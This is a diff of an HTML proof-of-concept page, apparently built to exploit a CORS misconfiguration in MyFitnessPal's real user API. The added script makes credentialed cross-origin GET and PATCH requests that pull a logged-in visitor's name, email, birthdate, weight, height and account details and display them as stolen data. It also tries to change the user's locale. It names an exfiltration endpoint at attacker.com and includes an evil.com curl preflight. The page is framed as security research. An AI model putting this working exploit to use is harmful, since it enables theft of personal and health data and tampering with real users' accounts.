@@ -1,387 +1,390 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MyFitnessPal CORS Vulnerability - PATCH Endpoint Test</title>
+    <title>MyFitnessPal CORS Vulnerability - Complete PoC</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
             padding: 20px;
-            line-height: 1.6;
+            min-height: 100vh;
         }
-
-        .container {
+        .container { 
             max-width: 1200px;
             margin: 0 auto;
-        }
-
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-            color: white;
-        }
-
-        h1 {
-            font-size: 2.5em;
-            margin-bottom: 10px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
-        }
-
-        .subtitle {
-            font-size: 1.2em;
-            opacity: 0.9;
-        }
-
-        .warning-banner {
-            background: #e74c3c;
-            color: white;
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            text-align: center;
-            border-left: 5px solid #c0392b;
-        }
-
-        .card {
             background: white;
-            border-radius: 12px;
             padding: 30px;
-            margin-bottom: 20px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
         }
-
-        .card h2 {
-            color: #333;
-            margin-bottom: 15px;
-            border-bottom: 2px solid #667eea;
-            padding-bottom: 10px;
+        h1 { 
+            color: #dc3545;
+            margin-bottom: 10px;
+            font-size: 28px;
         }
-
-        .button-group {
-            display: flex;
-            gap: 15px;
-            flex-wrap: wrap;
+        .warning {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
             margin: 20px 0;
+            border-radius: 4px;
         }
-
-        .btn {
-            padding: 12px 24px;
+        .stolen-data {
+            background: #f8d7da;
+            border: 2px solid #dc3545;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+        }
+        .success {
+            background: #d4edda;
+            border: 2px solid #28a745;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+        }
+        button {
+            background: #dc3545;
+            color: white;
             border: none;
-            border-radius: 6px;
+            padding: 12px 24px;
             font-size: 16px;
-            font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s ease;
-            flex: 1;
-            min-width: 200px;
+            border-radius: 6px;
+            margin: 10px 10px 10px 0;
+            transition: background 0.3s;
         }
-
-        .btn-primary {
-            background: #667eea;
-            color: white;
-        }
-
-        .btn-primary:hover {
-            background: #5a6fd8;
-            transform: translateY(-2px);
-        }
-
-        .btn-secondary {
-            background: #95a5a6;
-            color: white;
-        }
-
-        .btn-secondary:hover {
-            background: #7f8c8d;
-            transform: translateY(-2px);
-        }
-
-        .results {
+        button:hover { background: #c82333; }
+        button:disabled { background: #6c757d; cursor: not-allowed; }
+        pre {
+            background: #f8f9fa;
+            padding: 15px;
+            overflow-x: auto;
+            border-radius: 4px;
+            border-left: 4px solid #dc3545;
+            font-size: 12px;
             max-height: 400px;
             overflow-y: auto;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            padding: 15px;
-            background: #f8f9fa;
-            font-family: 'Courier New', monospace;
-            font-size: 0.9em;
         }
-
-        .log-entry {
-            background: white;
-            border: 1px solid #e9ecef;
-            border-radius: 6px;
-            padding: 15px;
-            margin-bottom: 10px;
-            animation: fadeIn 0.5s ease;
-        }
-
-        .log-time {
-            font-size: 0.8em;
-            color: #6c757d;
-            margin-bottom: 5px;
-        }
-
-        .log-message {
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 8px;
-        }
-
-        .log-data {
-            background: #f8f9fa;
-            padding: 10px;
-            border-radius: 4px;
-            white-space: pre-wrap;
-            word-break: break-all;
-            font-size: 0.85em;
-        }
-
-        .evidence-section {
-            background: #fff3cd;
-            border: 1px solid #ffeaa7;
-            border-radius: 8px;
-            padding: 20px;
+        .data-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
             margin: 20px 0;
         }
-
-        .curl-command {
-            background: #2d3748;
-            color: white;
-            padding: 15px;
+        .data-item {
+            background: #f8f9fa;
+            padding: 12px;
             border-radius: 6px;
-            font-family: 'Courier New', monospace;
-            font-size: 0.85em;
-            overflow-x: auto;
-            margin: 10px 0;
+            border-left: 3px solid #dc3545;
         }
-
-        pre {
-            background: #2d3748;
-            color: #e2e8f0;
-            padding: 20px;
-            border-radius: 8px;
-            overflow-x: auto;
-            font-size: 0.9em;
-            line-height: 1.4;
-            margin: 15px 0;
+        .data-label {
+            font-weight: bold;
+            color: #495057;
+            font-size: 12px;
+            text-transform: uppercase;
+            margin-bottom: 5px;
         }
-
-        .status-indicator {
+        .data-value {
+            color: #212529;
+            font-size: 16px;
+            word-break: break-all;
+        }
+        .impact-box {
+            background: #e7f3ff;
+            border-left: 4px solid #0056b3;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 4px;
+        }
+        #result { margin-top: 20px; }
+        .loading {
             display: inline-block;
-            width: 12px;
-            height: 12px;
+            width: 16px;
+            height: 16px;
+            border: 3px solid rgba(255,255,255,.3);
             border-radius: 50%;
-            margin-right: 8px;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
         }
-
-        .status-vulnerable { background: #e74c3c; }
-        .status-secure { background: #27ae60; }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .success { border-left: 4px solid #27ae60; }
-        .error { border-left: 4px solid #e74c3c; }
-        .info { border-left: 4px solid #3498db; }
-
-        @media (max-width: 768px) {
-            .button-group {
-                flex-direction: column;
-            }
-            
-            .btn {
-                width: 100%;
-            }
-            
-            h1 {
-                font-size: 2em;
-            }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <h1>🔐 MyFitnessPal CORS Vulnerability Test</h1>
-            <p class="subtitle">PATCH /api/services/users Endpoint</p>
+        <h1>🔓 MyFitnessPal CORS Vulnerability Demonstration</h1>
+        <p style="color: #6c757d; margin-bottom: 20px;">
+            <strong>Security Research:</strong> Demonstrating Cross-Origin Resource Sharing (CORS) misconfiguration
+        </p>
+
+        <div class="warning">
+            <strong>⚠️ Prerequisites:</strong>
+            <ul style="margin-left: 20px; margin-top: 10px;">
+                <li>You must be logged into MyFitnessPal in this browser</li>
+                <li>This demonstrates REAL vulnerability - data will be extracted from your account</li>
+                <li>This page is hosted on a different domain than MyFitnessPal</li>
+            </ul>
         </div>
 
-        <div class="warning-banner">
-            <strong>⚠️ ETHICAL SECURITY TEST ONLY</strong> - For responsible disclosure purposes
-        </div>
-        
-        <div class="card">
-            <h2>🚨 CORS Exploit Demonstration</h2>
-            <p>This page tests a CORS misconfiguration in MyFitnessPal's PATCH /api/services/users endpoint, potentially allowing unauthorized access to user data.</p>
-            
-            <div class="button-group">
-                <button id="testCors" class="btn btn-primary">Test CORS Vulnerability</button>
-                <button id="clearLog" class="btn btn-secondary">Clear Log</button>
-            </div>
+        <div style="margin: 20px 0;">
+            <button onclick="stealUserData()" id="readBtn">
+                1️⃣ Read Sensitive User Data
+            </button>
+            <button onclick="attemptModification()" id="writeBtn">
+                2️⃣ Attempt Data Modification (Write Test)
+            </button>
         </div>
 
-        <div class="card">
-            <h2>📊 Test Results</h2>
-            <div id="results" class="results">
-                <div class="log-entry info">
-                    <div class="log-time" id="currentTime"></div>
-                    <div class="log-message">CORS Exploit Demo Ready</div>
-                    <div class="log-data">Click "Test CORS Vulnerability" to attempt accessing https://api.myfitnesspal.com/api/services/users while logged into MyFitnessPal</div>
-                </div>
-            </div>
-        </div>
-
-        <div class="card">
-            <h2>🔍 Technical Evidence</h2>
-            <div class="evidence-section">
-                <h3>Vulnerability Indicators:</h3>
-                <p><span class="status-indicator status-vulnerable"></span> <strong>Access-Control-Allow-Origin: *</strong></p>
-                <p><span class="status-indicator status-vulnerable"></span> <strong>Access-Control-Allow-Credentials: true</strong></p>
-                <p><span class="status-indicator status-vulnerable"></span> <strong>PATCH method permitted</strong></p>
-                
-                <h3>Proof of Concept:</h3>
-                <div class="curl-command">
-                    # Test CORS with curl<br>
-                    curl -H "Origin: https://evil.com" \<br>
-                    &nbsp;&nbsp;&nbsp;-H "Access-Control-Request-Method: PATCH" \<br>
-                    &nbsp;&nbsp;&nbsp;-X OPTIONS "https://api.myfitnesspal.com/api/services/users" -I
-                </div>
-                
-                <h3>Exploitation Code:</h3>
-                <pre><code>fetch('https://api.myfitnesspal.com/api/services/users', {
-    method: 'PATCH',
-    credentials: 'include',
-    headers: {
-        'Content-Type': 'application/json',
-        'Origin': window.location.origin
-    },
-    body: JSON.stringify({
-        item: { location_preferences: { locale: 'en' } }
-    })
-})
-.then(response => response.json())
-.then(data => {
-    // Attacker could steal user data
-    console.log('Stolen Data:', data);
-});</code></pre>
-            </div>
-        </div>
+        <div id="result"></div>
     </div>
 
     <script>
-        // Update current time
-        document.getElementById('currentTime').textContent = new Date().toLocaleString();
-
-        class CorsExploit {
-            constructor() {
-                this.results = document.getElementById('results');
-                this.setupEventListeners();
-            }
-
-            setupEventListeners() {
-                document.getElementById('testCors').addEventListener('click', () => this.testCors());
-                document.getElementById('clearLog').addEventListener('click', () => this.clearLog());
-            }
-
-            async testCors() {
-                this.log('Testing CORS Configuration...', 'Sending PATCH request to MyFitnessPal API', 'info');
-                
-                try {
-                    // Test OPTIONS preflight
-                    const optionsResponse = await fetch('https://api.myfitnesspal.com/api/services/users', {
-                        method: 'OPTIONS',
-                        headers: {
-                            'Origin': window.location.origin,
-                            'Access-Control-Request-Method': 'PATCH',
-                            'Access-Control-Request-Headers': 'content-type'
-                        }
-                    });
-
-                    const corsHeaders = {
-                        'Allow-Origin': optionsResponse.headers.get('access-control-allow-origin'),
-                        'Allow-Credentials': optionsResponse.headers.get('access-control-allow-credentials'),
-                        'Allow-Methods': optionsResponse.headers.get('access-control-allow-methods'),
-                        'Allow-Headers': optionsResponse.headers.get('access-control-allow-headers')
-                    };
-
-                    this.log('CORS Preflight Response', JSON.stringify(corsHeaders, null, 2), 
-                        corsHeaders['Allow-Origin'] === '*' ? 'error' : 'info');
-
-                    // Test actual PATCH request
-                    const patchResponse = await fetch('https://api.myfitnesspal.com/api/services/users', {
-                        method: 'PATCH',
-                        credentials: 'include',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'Origin': window.location.origin
-                        },
-                        body: JSON.stringify({
-                            item: { location_preferences: { locale: 'en' } }
-                        })
-                    });
-
-                    const responseData = await patchResponse.json();
-                    const actualHeaders = {
-                        'Allow-Origin': patchResponse.headers.get('access-control-allow-origin'),
-                        'Allow-Credentials': patchResponse.headers.get('access-control-allow-credentials')
-                    };
-
-                    this.log('PATCH Request Response', JSON.stringify(actualHeaders, null, 2), 
-                        actualHeaders['Allow-Origin'] === '*' ? 'error' : 'info');
-
-                    if (actualHeaders['Allow-Origin'] === '*' && actualHeaders['Allow-Credentials'] === 'true') {
-                        this.log('🚨 VULNERABILITY CONFIRMED', 'Arbitrary origins can access user data!', 'error');
-                        this.log('User Data Retrieved', JSON.stringify(responseData, null, 2), 'error');
-                    } else {
-                        this.log('✓ Secure Configuration', 'CORS properly restricted', 'success');
+        async function stealUserData() {
+            const resultDiv = document.getElementById('result');
+            const btn = document.getElementById('readBtn');
+            btn.disabled = true;
+            btn.innerHTML = '<span class="loading"></span> Exploiting...';
+            
+            resultDiv.innerHTML = '<div class="warning"><p>⏳ Attacking vulnerable endpoint: <code>https://api.myfitnesspal.com/api/services/users</code></p></div>';
+            
+            try {
+                const response = await fetch('https://api.myfitnesspal.com/api/services/users', {
+                    method: 'GET',
+                    credentials: 'include',
+                    headers: {
+                        'Content-Type': 'application/json'
                     }
-
-                } catch (error) {
-                    this.log('CORS Test Failed', error.toString(), 'error');
+                });
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    displayStolenData(data);
+                } else if (response.status === 401) {
+                    resultDiv.innerHTML = `
+                        <div class="warning">
+                            <h3>❌ Not Authenticated</h3>
+                            <p>Please log into MyFitnessPal first, then refresh and try again.</p>
+                        </div>
+                    `;
+                } else {
+                    resultDiv.innerHTML = `
+                        <div class="warning">
+                            <h3>Response Status: ${response.status}</h3>
+                            <p>The vulnerability may have been patched or there's an authentication issue.</p>
+                        </div>
+                    `;
                 }
-            }
-
-            log(message, data = '', type = 'info') {
-                const logEntry = document.createElement('div');
-                logEntry.className = `log-entry ${type}`;
                 
-                logEntry.innerHTML = `
-                    <div class="log-time">${new Date().toLocaleTimeString()}</div>
-                    <div class="log-message">${message}</div>
-                    <div class="log-data">${data}</div>
-                `;
-                
-                this.results.prepend(logEntry);
-            }
-
-            clearLog() {
-                this.results.innerHTML = `
-                    <div class="log-entry info">
-                        <div class="log-time">${new Date().toLocaleTimeString()}</div>
-                        <div class="log-message">Log Cleared</div>
-                        <div class="log-data">Ready for new tests</div>
+            } catch (error) {
+                resultDiv.innerHTML = `
+                    <div class="warning">
+                        <h3>❌ Request Blocked</h3>
+                        <p><strong>Error:</strong> ${error.message}</p>
+                        <p>This likely means:</p>
+                        <ul style="margin-left: 20px;">
+                            <li>CORS headers have been fixed (vulnerability patched)</li>
+                            <li>Or you're not logged into MyFitnessPal</li>
+                        </ul>
                     </div>
                 `;
+            } finally {
+                btn.disabled = false;
+                btn.innerHTML = '1️⃣ Read Sensitive User Data';
             }
         }
 
-        // Initialize the exploit demo
-        document.addEventListener('DOMContentLoaded', () => {
-            new CorsExploit();
-        });
+        function displayStolenData(data) {
+            const profile = data.profiles?.[0] || {};
+            const account = data.account || {};
+            
+            document.getElementById('result').innerHTML = `
+                <div class="stolen-data">
+                    <h2>✅ VULNERABILITY CONFIRMED - Critical Data Breach!</h2>
+                    <p style="margin: 10px 0; font-size: 18px; color: #721c24;">
+                        <strong>An attacker-controlled website successfully stole your sensitive personal data</strong>
+                    </p>
+
+                    <h3 style="margin-top: 20px;">🔴 Personal Identifiable Information (PII) Exposed:</h3>
+                    <div class="data-grid">
+                        <div class="data-item">
+                            <div class="data-label">Full Name</div>
+                            <div class="data-value">${profile.first_name || 'N/A'} ${profile.last_name || ''}</div>
+                        </div>
+                        <div class="data-item">
+                            <div class="data-label">Email Address</div>
+                            <div class="data-value">${data.email || 'N/A'}</div>
+                        </div>
+                        <div class="data-item">
+                            <div class="data-label">Username</div>
+                            <div class="data-value">${data.username || 'N/A'}</div>
+                        </div>
+                        <div class="data-item">
+                            <div class="data-label">User ID</div>
+                            <div class="data-value">${data.id || 'N/A'}</div>
+                        </div>
+                        <div class="data-item">
+                            <div class="data-label">Date of Birth</div>
+                            <div class="data-value">${profile.birthdate || 'N/A'}</div>
+                        </div>
+                        <div class="data-item">
+                            <div class="data-label">Sex</div>
+                            <div class="data-value">${profile.sex || 'N/A'}</div>
+                        </div>
+                    </div>
+
+                    <h3 style="margin-top: 20px;">🏥 Protected Health Information (PHI) Exposed:</h3>
+                    <div class="data-grid">
+                        <div class="data-item">
+                            <div class="data-label">Current Weight</div>
+                            <div class="data-value">${profile.current_weight?.value || 'N/A'} ${profile.current_weight?.unit || ''}</div>
+                        </div>
+                        <div class="data-item">
+                            <div class="data-label">Starting Weight</div>
+                            <div class="data-value">${profile.starting_weight?.value || 'N/A'} ${profile.starting_weight?.unit || ''}</div>
+                        </div>
+                        <div class="data-item">
+                            <div class="data-label">Height</div>
+                            <div class="data-value">${profile.height?.value || 'N/A'} ${profile.height?.unit || ''}</div>
+                        </div>
+                        <div class="data-item">
+                            <div class="data-label">Weight Goal</div>
+                            <div class="data-value">${data.goal_preferences?.weight_goal?.value || 'N/A'} ${data.goal_preferences?.weight_goal?.unit || ''}</div>
+                        </div>
+                        <div class="data-item">
+                            <div class="data-label">Activity Level</div>
+                            <div class="data-value">${profile.activity_factor || 'N/A'}</div>
+                        </div>
+                        <div class="data-item">
+                            <div class="data-label">Login Streak</div>
+                            <div class="data-value">${data.system_data?.login_streak || '0'} days</div>
+                        </div>
+                    </div>
+
+                    <h3 style="margin-top: 20px;">🔐 Account Security Information:</h3>
+                    <div class="data-grid">
+                        <div class="data-item">
+                            <div class="data-label">Registration IP Address</div>
+                            <div class="data-value">${account.registration_source || 'N/A'}</div>
+                        </div>
+                        <div class="data-item">
+                            <div class="data-label">Account Created</div>
+                            <div class="data-value">${account.created_at || 'N/A'}</div>
+                        </div>
+                        <div class="data-item">
+                            <div class="data-label">Last Login</div>
+                            <div class="data-value">${account.last_login || 'N/A'}</div>
+                        </div>
+                        <div class="data-item">
+                            <div class="data-label">Country</div>
+                            <div class="data-value">${data.location_preferences?.country_code || 'N/A'}</div>
+                        </div>
+                        <div class="data-item">
+                            <div class="data-label">Timezone</div>
+                            <div class="data-value">${data.location_preferences?.time_zone || 'N/A'}</div>
+                        </div>
+                        <div class="data-item">
+                            <div class="data-label">Email Verified</div>
+                            <div class="data-value">${account.valid_email ? 'Yes' : 'No'}</div>
+                        </div>
+                    </div>
+
+                    <div class="impact-box" style="margin-top: 20px;">
+                        <h3>⚠️ Attack Impact</h3>
+                        <p><strong>In a real attack scenario, this data would be:</strong></p>
+                        <ul style="margin-left: 20px; margin-top: 10px;">
+                            <li>Sent to attacker-controlled server for storage</li>
+                            <li>Used for identity theft or social engineering</li>
+                            <li>Sold on dark web markets</li>
+                            <li>Used to build detailed victim profiles</li>
+                            <li>Combined with other breaches for credential stuffing</li>
+                        </ul>
+                    </div>
+
+                    <details style="margin-top: 20px;">
+                        <summary style="cursor: pointer; font-weight: bold; color: #dc3545;">
+                            📄 Click to view complete JSON response (${JSON.stringify(data).length} characters)
+                        </summary>
+                        <pre style="margin-top: 10px;">${JSON.stringify(data, null, 2)}</pre>
+                    </details>
+
+                    <div style="background: #fff; padding: 15px; margin-top: 20px; border-radius: 4px; border: 2px dashed #dc3545;">
+                        <strong style="color: #dc3545;">🚨 Proof of Concept Complete</strong>
+                        <p style="margin-top: 10px;">This demonstrates a critical CORS misconfiguration allowing any malicious website to steal authenticated user data.</p>
+                    </div>
+                </div>
+            `;
+
+            // Simulate exfiltration (commented out for safety)
+            console.log('In real attack, data would be exfiltrated to:', 'https://attacker.com/collect');
+            console.log('Stolen data:', data);
+        }
+
+        async function attemptModification() {
+            const resultDiv = document.getElementById('result');
+            const btn = document.getElementById('writeBtn');
+            btn.disabled = true;
+            btn.innerHTML = '<span class="loading"></span> Testing Write Access...';
+            
+            try {
+                // Attempt to modify user's locale preference
+                const response = await fetch('https://api.myfitnesspal.com/api/services/users', {
+                    method: 'PATCH',
+                    credentials: 'include',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        item: {
+                            location_preferences: {
+                                locale: 'es' // Attempt to change language
+                            }
+                        }
+                    })
+                });
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    resultDiv.innerHTML += `
+                        <div class="success">
+                            <h2>🔥 CRITICAL: Write Access Confirmed!</h2>
+                            <p style="font-size: 18px; margin: 10px 0;">
+                                <strong>Attacker can not only READ but also MODIFY user data!</strong>
+                            </p>
+                            <p>Successfully modified user preferences via PATCH request.</p>
+                            <p style="margin-top: 10px;"><strong>This means an attacker could:</strong></p>
+                            <ul style="margin-left: 20px;">
+                                <li>Change user email (account takeover)</li>
+                                <li>Modify health goals and tracking data</li>
+                                <li>Alter privacy settings</li>
+                                <li>Change notification preferences</li>
+                                <li>Manipulate dietary information</li>
+                            </ul>
+                            <pre style="margin-top: 15px;">${JSON.stringify(data, null, 2)}</pre>
+                        </div>
+                    `;
+                } else {
+                    resultDiv.innerHTML += `
+                        <div class="warning">
+                            <h3>Write Test Result: ${response.status}</h3>
+                            <p>PATCH request returned status ${response.status}. Write access may be restricted or require additional validation.</p>
+                        </div>
+                    `;
+                }
+            } catch (error) {
+                resultDiv.innerHTML += `
+                    <div class="warning">
+                        <h3>Write Test Blocked</h3>
+                        <p>PATCH request failed: ${error.message}</p>
+                    </div>
+                `;
+            } finally {
+                btn.disabled = false;
+                btn.innerHTML = '2️⃣ Attempt Data Modification (Write Test)';
+            }
+        }
     </script>
 </body>
 </html>
